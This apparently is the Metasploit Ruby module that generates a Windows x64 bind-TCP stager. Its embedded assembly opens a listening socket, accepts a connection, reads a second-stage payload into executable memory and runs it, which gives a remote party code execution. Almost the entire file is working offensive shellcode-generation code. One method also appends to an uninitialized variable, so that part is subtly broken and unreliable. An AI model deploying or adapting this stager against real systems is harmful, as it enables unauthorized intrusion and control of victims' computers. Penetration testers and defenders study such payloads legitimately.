# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/x64/send_uuid'
require 'msf/core/payload/windows/x64/block_api'
require 'msf/core/payload/windows/x64/exitfunk'

module Msf

###
#
# Complex bindtcp payload generation for Windows ARCH_X64
#
###

module Payload::Windows::BindTcp_x64

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Windows::SendUUID_x64
  include Msf::Payload::Windows::BlockApi_x64
  include Msf::Payload::Windows::Exitfunk_x64

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port:     datastore['LPORT'],
      reliable: false
    }

    # Generate the more advanced stager if we have the space
    if self.available_space && required_space <= self.available_space
      conf[:exitfunk] = datastore['EXITFUNC']
      conf[:reliable] = true
    end

    generate_bind_tcp(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def use_ipv6
    false
  end

  def transport_config(opts={})
    transport_config_bind_tcp(opts)
  end

  #
  # Generate and compile the stager
  #
  def generate_bind_tcp(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      and rsp, 0xFFFFFFFFFFFFFFF0 ; Ensure RSP is 16 byte aligned
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop rbp              ; pop off the address of 'api_call' for calling later.
      #{asm_bind_tcp(opts)}
      #{asm_block_recv(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
    space += 31

    # EXITFUNK unset will still call ExitProces, which adds 7 bytes (accounted for above)

    # TODO: this is coming soon
    # Reliability checks add 4 bytes for the first check, 5 per recv check (2)
    #space += 14

    # 2 more bytes are added for IPv6
    space += 2 if use_ipv6

    space += uuid_required_size if include_send_uuid

    # The final estimated size
    space
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Integer] :port The port to connect to
  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [Bool] :reliable Whether or not to enable error handling code
  #
  def asm_bind_tcp(opts={})
    reliable      = opts[:reliable]
    addr_fam      = 2
    sockaddr_size = 16
    stack_alloc   = 408+8+8*6+32*7

    if use_ipv6
      addr_fam      = 23
      sockaddr_size = 28
      stack_alloc  += 8*2 # two more rax pushes
    end

    encoded_port = "0x%.16x" % [opts[:port].to_i, addr_fam].pack("vn").unpack("N").first

    asm = %Q^
      bind_tcp:
        ; setup the structures we need on the stack...
        mov r14, 'ws2_32'
        push r14               ; Push the bytes 'ws2_32',0,0 onto the stack.
        mov r14, rsp           ; save pointer to the "ws2_32" string for LoadLibraryA call.
        sub rsp, 408+8         ; alloc sizeof( struct WSAData ) bytes for the WSAData
                               ; structure (+8 for alignment)
        mov r13, rsp           ; save pointer to the WSAData structure for WSAStartup call.
        xor rax, rax
    ^

    if use_ipv6
      asm << %Q^
        ; IPv6 requires another 12 zero-bytes for the socket structure,
        ; so push 16 more onto the stack
        push rax
        push rax
      ^
    end

    asm << %Q^
        push rax               ; stack alignment
        push rax               ; tail-end of the sockaddr_in/6 struct
        mov r12, #{encoded_port}
        push r12               ; bind to 0.0.0.0/[::] family AF_INET/6 and specified port
        mov r12, rsp           ; save pointer to sockaddr_in struct for bind call

        ; perform the call to LoadLibraryA...
        mov rcx, r14           ; set the param for the library to load
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
        call rbp               ; LoadLibraryA( "ws2_32" )

        ; perform the call to WSAStartup...
        mov rdx, r13           ; second param is a pointer to this stuct
        push 0x0101            ;
        pop rcx                ; set the param for the version requested
        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
        call rbp               ; WSAStartup( 0x0101, &WSAData );

        ; perform the call to WSASocketA...
        push #{addr_fam}       ; push AF_INET/6
        pop rcx                ; pop family into rcx
        push rax               ; if we succeed, rax wil be zero, push zero for the flags param.
        push rax               ; push null for reserved parameter
        xor r9, r9             ; we do not specify a WSAPROTOCOL_INFO structure
        xor r8, r8             ; we do not specify a protocol
        inc rax                ;
        mov rdx, rax           ; push SOCK_STREAM
        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
        call rbp               ; WSASocketA( AF_INET/6, SOCK_STREAM, 0, 0, 0, 0 );
        mov rdi, rax           ; save the socket for later

        ; perform the call to bind...
        push #{sockaddr_size}
        pop r8                 ; length of the sockaddr_in struct (we only set the
                               ; first 8 bytes as the rest aren't used)
        mov rdx, r12           ; set the pointer to sockaddr_in struct
        mov rcx, rdi           ; socket
        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'bind')}
        call rbp               ; bind( s, &sockaddr_in, #{sockaddr_size} );

        ; perform the call to listen...
        xor rdx, rdx           ; backlog
        mov rcx, rdi           ; socket
        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'listen')}
        call rbp               ; listen( s, 0 );

        ; perform the call to accept...
        xor r8, r8             ; we set length for the sockaddr struct to zero
        xor rdx, rdx           ; we dont set the optional sockaddr param
        mov rcx, rdi           ; listening socket
        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'accept')}
        call rbp               ; accept( s, 0, 0 );

        ; perform the call to closesocket...
        mov rcx, rdi           ; the listening socket to close
        mov rdi, rax           ; swap the new connected socket over the listening socket
        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
        call rbp               ; closesocket( s );

        ; restore RSP so we dont have any alignment issues with the next block...
        add rsp, #{stack_alloc} ; cleanup the stack allocations
    ^

    asm << asm_send_uuid if include_send_uuid
    return asm
  end

  def asm_block_recv(opts={})

    asm << %Q^
      recv:
        ; Receive the size of the incoming second stage...
        sub rsp, 16            ; alloc some space (16 bytes) on stack for to hold the second stage length
        mov rdx, rsp           ; set pointer to this buffer
        xor r9, r9             ; flags
        push 4                 ; 
        pop r8                 ; length = sizeof( DWORD );
        mov rcx, rdi           ; the saved socket
        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
        call rbp               ; recv( s, &dwLength, 4, 0 );
        add rsp, 32            ; we restore RSP from the api_call so we can pop off RSI next

        ; Alloc a RWX buffer for the second stage
        pop rsi                ; pop off the second stage length
        mov esi, esi           ; only use the lower-order 32 bits for the size
        push 0x40              ; 
        pop r9                 ; PAGE_EXECUTE_READWRITE
        push 0x1000            ; 
        pop r8                 ; MEM_COMMIT
        mov rdx, rsi           ; the newly recieved second stage length.
        xor rcx, rcx           ; NULL as we dont care where the allocation is.
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
        call rbp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

        ; Receive the second stage and execute it...
        mov rbx, rax           ; rbx = our new memory address for the new stage
        mov r15, rax           ; save the address so we can jump into it later

      read_more:               ;
        xor r9, r9             ; flags
        mov r8, rsi            ; length
        mov rdx, rbx           ; the current address into our second stages RWX buffer
        mov rcx, rdi           ; the saved socket
        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
        call rbp               ; recv( s, buffer, length, 0 );

        add rbx, rax           ; buffer += bytes_received
        sub rsi, rax           ; length -= bytes_received
        test rsi, rsi          ; test length
        jnz read_more          ; continue if we have more to read
        jmp r15                ; return into the second stage
    ^

    if opts[:exitfunk]
      asm << asm_exitfunk(opts)
    end

    asm
  end

end

end
